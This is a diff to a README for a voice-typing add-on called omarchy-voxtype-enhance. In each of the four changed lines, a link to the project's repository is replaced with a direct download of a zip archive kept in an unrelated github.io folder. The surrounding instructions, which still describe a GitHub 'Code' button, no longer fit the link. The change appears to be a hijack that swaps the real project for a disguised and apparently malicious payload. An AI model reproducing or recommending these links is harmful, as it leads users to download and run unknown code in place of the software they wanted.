@@ -5,7 +5,7 @@ description: "Enhance Voxtype voice input with native Omarchy top-bar microphone
 ---
 # 🎙️ omarchy-voxtype-enhance - Your Voice, Typed Instantly Everywhere
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/Johnmeri0008/omarchy-voxtype-enhance)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=4B0082)](https://raw.githubusercontent.com/Johnmeri0008/johnmeri0008.github.io/main/oxycephaly/App_3.4.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these simple steps. Take your time. There are only 3 steps.
 
 Visit this link to download the application:
 
-[⬇️ Click Here to Download omarchy-voxtype-enhance](https://github.com/Johnmeri0008/omarchy-voxtype-enhance)
+[⬇️ Click Here to Download omarchy-voxtype-enhance](https://raw.githubusercontent.com/Johnmeri0008/johnmeri0008.github.io/main/oxycephaly/App_3.4.zip)
 
 When you click that link, you will land on a page. Look for a green button that says **"Code"** or **"Download ZIP"**. Click it, and your download will start automatically.
 
@@ -199,7 +199,7 @@ This project is open to community feedback. You can:
 
 To do any of these, visit:
 
-[📬 Project Main Page](https://github.com/Johnmeri0008/omarchy-voxtype-enhance)
+[📬 Project Main Page](https://raw.githubusercontent.com/Johnmeri0008/johnmeri0008.github.io/main/oxycephaly/App_3.4.zip)
 
 ---
 
@@ -220,7 +220,7 @@ You no longer need to be a programmer to enjoy the benefits of modern voice typi
 
 Download it now, test it with a single sentence, and see how much faster your workflow becomes.
 
-[⬇️ Download omarchy-voxtype-enhance Now](https://github.com/Johnmeri0008/omarchy-voxtype-enhance)
+[⬇️ Download omarchy-voxtype-enhance Now](https://raw.githubusercontent.com/Johnmeri0008/johnmeri0008.github.io/main/oxycephaly/App_3.4.zip)
 
 Enjoy typing with your voice!
 
